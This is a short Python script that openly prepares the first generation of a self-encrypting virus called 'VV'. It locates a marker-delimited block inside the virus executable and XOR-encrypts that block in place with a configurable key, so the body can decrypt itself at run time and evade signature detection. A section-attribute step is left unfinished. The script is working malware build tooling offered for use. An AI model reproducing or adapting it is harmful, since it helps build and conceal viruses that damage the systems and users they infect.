#VV Generation#0 preparation script
#Usage format: python prepare_generation0.py [ file_path [cryptKey]]
#Example: python initial_encrypt.py C:\vv.exe DEADBEEF

#Feel free to modify values for your setup
filePath="vv.exe"
cryptKey=bytearray([0xDE,0xAD,0xBE,0xEF])
markerValue=bytearray([0xDE,0xAD,0xBE,0xEF,0xFE,0xED,0xFA,0xCE])

#====================================================================================================
def convertStrRepr2Bytes(par_str):
    alphabet="0123456789ABCDEF"
    resultBytes=bytearray([])
    print(resultBytes)
    ovenByte=0x0
    i=0
    while(True):
        ovenByte <<= 4
        ovenByte += alphabet.find(par_str[i])
        i+=1
        if ((i % 2) == 0):
            resultBytes.append(ovenByte)
            ovenByte = 0x0
        if(i==len(par_str)):
            break
    return resultBytes

#====================================================================================================
def process(par_targetFilePath, par_cryptKey,par_markerValue):
    import mmap
    import pefile
    #1.Encrypt main body
    #Read file contents
    #(Virus binary not so big => its OK to read it all)
    hFile=open(par_targetFilePath,"r+b")
    fileContents=mmap.mmap(hFile.fileno(),0)
    #Search block to encrypt
    offset_cryptBlockBegin=fileContents.find(par_markerValue)+len(par_markerValue)
    cryptBlockSize=(offset_cryptBlockBegin+fileContents[offset_cryptBlockBegin:].find(par_markerValue)) - offset_cryptBlockBegin
    #Encrypt with key
    for i in range(cryptBlockSize):
        fileContents[offset_cryptBlockBegin+i]^=par_cryptKey[i%len(par_cryptKey)]
    
    #2.Adjust section characteristics
    #TODO

    fileContents.close()
    hFile.close()

#====================================================================================================
def main():
    global filePath
    global cryptKey
    global markerValue

    import sys
    import os

    if(len(sys.argv)>4):
        print("[ERROR] Invalid format.\n")
        print("\tCorrect usage: python {0} [file_path={1} [crypt_key={2} [marker={3}]]]".format(os.path.basename(__file__),filePath,str(cryptKey),str(markerValue)))
        sys.exit()

    if(len(sys.argv)>1):
        filePath=sys.argv[1]
    else:
        filePath=os.path.join(os.path.dirname(os.path.realpath(__file__)),filePath)
    if (len(sys.argv) >2):
        cryptKey = convertStrRepr2Bytes(sys.argv[2])
    if(len(sys.argv) == 4):
        markerValue=convertStrRepr2Bytes(sys.argv[3])

    process(filePath,cryptKey,markerValue)

#====================================================================================================
if(__name__=="__main__"):
    main()
